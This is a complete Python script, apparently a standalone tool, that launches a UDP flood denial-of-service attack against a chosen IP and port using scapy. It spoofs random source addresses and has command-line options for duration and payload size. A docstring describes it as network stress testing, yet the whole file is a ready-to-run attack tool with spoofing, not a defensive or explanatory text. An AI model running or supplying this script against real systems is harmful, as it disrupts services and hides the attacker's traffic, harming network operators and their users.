#!/usr/bin/env python

"""
UDP Flood Attack Script
- Floods target with UDP packets
- Used for network stress testing
"""

from scapy.all import *
import argparse
import sys
import time
from datetime import datetime
import random

def udp_flood(target_ip, target_port, duration=60, payload_size=1024):
    """
    Execute a UDP flood attack against the target
    
    :param target_ip: Target IP address
    :param target_port: Target port number
    :param duration: Attack duration in seconds
    :param payload_size: Size of the UDP payload in bytes
    """
    print(f"[*] Starting UDP flood attack against {target_ip}:{target_port}")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] UDP payload size: {payload_size} bytes")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    # Track start time
    start_time = time.time()
    packet_count = 0
    
    # Create random payload
    payload = b'X' * payload_size
    
    try:
        # Continue until duration is reached
        while time.time() - start_time < duration:
            # Create a random source IP (spoofing)
            source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            source_port = random.randint(1024, 65535)
            
            # Craft the UDP packet
            packet = IP(src=source_ip, dst=target_ip)/UDP(sport=source_port, dport=target_port)/Raw(load=payload)
            
            # Send the packet
            send(packet, verbose=0)
            packet_count += 1
            
            # Print status every 100 packets
            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                print(f"[*] Sent {packet_count} packets | Elapsed time: {elapsed:.2f}s")
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    
    # Print final statistics
    total_time = time.time() - start_time
    print(f"\n[*] Attack completed")
    print(f"[*] Total packets sent: {packet_count}")
    print(f"[*] Total time: {total_time:.2f} seconds")
    print(f"[*] Packet rate: {packet_count/total_time:.2f} packets/second")
    print(f"[*] Data sent: {(packet_count * payload_size) / (1024*1024):.2f} MB")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='UDP Flood Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=53, help='Target port (default: 53)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('-s', '--size', type=int, default=1024, help='UDP payload size in bytes (default: 1024)')
    
    args = parser.parse_args()
    
    # Execute attack
    udp_flood(args.target, args.port, args.duration, args.size)
